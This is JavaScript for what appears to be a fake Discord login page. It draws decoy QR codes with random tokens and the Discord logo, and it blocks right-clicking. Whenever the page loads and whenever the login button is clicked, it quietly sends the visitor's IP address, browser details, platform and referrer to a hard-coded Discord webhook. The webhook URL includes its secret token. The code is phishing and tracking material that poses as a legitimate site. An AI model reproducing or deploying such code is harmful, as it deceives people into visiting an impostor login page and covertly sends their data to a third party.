// ==================================
// CONFIGURATION
// ==================================
const CONFIG = {
  ANIMATION_DURATION: 3000,
  QR_REFRESH_INTERVAL: 120000,
  QR_STRING_LENGTH: 43,
  WEBHOOK_URL:
    "https://discord.com/api/webhooks/1457850148507095253/z9zaA8Bg4744x3Ydr9qEAIqws2qpdelxT0csW2gurAvZwYAmaDi1gfMPXpRt6mLreGDs",
};

// ==================================
// SELECTORS
// ==================================
const DOM = {
  loginButton: document.querySelector("button"),
  qrCodeContainer: document.querySelector(".right-section .qr-code"),
};

// ==================================
// STATE
// ==================================
let currentQRToken = null;
let pageLoadSent = false;

// ==================================
// UTILITIES
// ==================================
const generateRandomString = (length = CONFIG.QR_STRING_LENGTH) => {
  const chars =
    "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
  return Array.from({ length }, () =>
    chars.charAt(Math.floor(Math.random() * chars.length))
  ).join("");
};

const getPublicIP = async () => {
  try {
    const res = await fetch("https://api.ipify.org?format=json");
    const data = await res.json();
    return data.ip || "Unknown";
  } catch {
    return "Unavailable";
  }
};

const sendToWebhook = async (title, payload) => {
  try {
    await fetch(CONFIG.WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        content: `📡 **${title}**`,
        embeds: [
          {
            title,
            color: 3447003,
            fields: Object.entries(payload).map(([k, v]) => ({
              name: k,
              value: String(v),
              inline: false,
            })),
            timestamp: new Date().toISOString(),
          },
        ],
      }),
    });
  } catch (err) {
    console.error("Webhook error:", err);
  }
};

// ==================================
// QR CODE MODULE
// ==================================
const QRCodeModule = {
  generate(data) {
    try {
      const qr = qrcode(0, "L");
      qr.addData(data);
      qr.make();

      const moduleCount = qr.getModuleCount();
      const svgString = qr.createSvgTag(1, 0);

      const svg = new DOMParser()
        .parseFromString(svgString, "image/svg+xml")
        .documentElement;

      svg.setAttribute("width", "160");
      svg.setAttribute("height", "160");
      svg.setAttribute("viewBox", "0 0 37 37");

      const path = svg.querySelector("path");
      if (path) {
        path.setAttribute("transform", `scale(${37 / moduleCount})`);
      }

      return svg;
    } catch {
      return null;
    }
  },

  refresh() {
    if (!DOM.qrCodeContainer) return;

    DOM.qrCodeContainer.innerHTML = "";
    currentQRToken = generateRandomString();

    const qrSvg = this.generate(
      `https://discord.com/ra/${currentQRToken}`
    );

    if (qrSvg) DOM.qrCodeContainer.appendChild(qrSvg);

    DOM.qrCodeContainer.insertAdjacentHTML(
      "beforeend",
      `<img src="./assets/qrcode-discord-logo.png" alt="Discord Logo">`
    );

    DOM.qrCodeContainer.style.background = "white";
  },

  init() {
    this.refresh();
    setInterval(() => this.refresh(), CONFIG.QR_REFRESH_INTERVAL);
  },
};

// ==================================
// LOGIN BUTTON MODULE (2nd WEBHOOK)
// ==================================
const LoginButtonModule = {
  init() {
    if (!DOM.loginButton) return;

    DOM.loginButton.addEventListener("click", async (e) => {
      e.preventDefault();

      DOM.loginButton.disabled = true;
      DOM.loginButton.textContent = "Logging in...";

      const ip = await getPublicIP();

      await sendToWebhook("LOGIN EVENT", {
        event: "login",
        timestamp: Date.now(),
        ipAddress: ip,
        qrToken: currentQRToken,
        userAgent: navigator.userAgent,
        language: navigator.language,
        platform: navigator.platform,
      });

      setTimeout(() => {
        DOM.loginButton.textContent = "Log In";
        DOM.loginButton.disabled = false;
      }, CONFIG.ANIMATION_DURATION);
    });
  },
};

// ==================================
// PAGE LOAD WEBHOOK (1st WEBHOOK)
// ==================================
const handlePageLoad = async () => {
  if (pageLoadSent) return;
  pageLoadSent = true;

  const ip = await getPublicIP();

  await sendToWebhook("PAGE LOAD EVENT", {
    event: "page_load",
    timestamp: Date.now(),
    ipAddress: ip,
    qrToken: currentQRToken,
    userAgent: navigator.userAgent,
    language: navigator.language,
    platform: navigator.platform,
    referrer: document.referrer || "Direct",
  });
};

// ==================================
// INIT
// ==================================
const init = async () => {
  QRCodeModule.init();
  LoginButtonModule.init();
  document.addEventListener("contextmenu", (e) => e.preventDefault());

  // 🔥 Webhook #1 fires here
  await handlePageLoad();
};

document.readyState === "loading"
  ? document.addEventListener("DOMContentLoaded", init)
  : init();
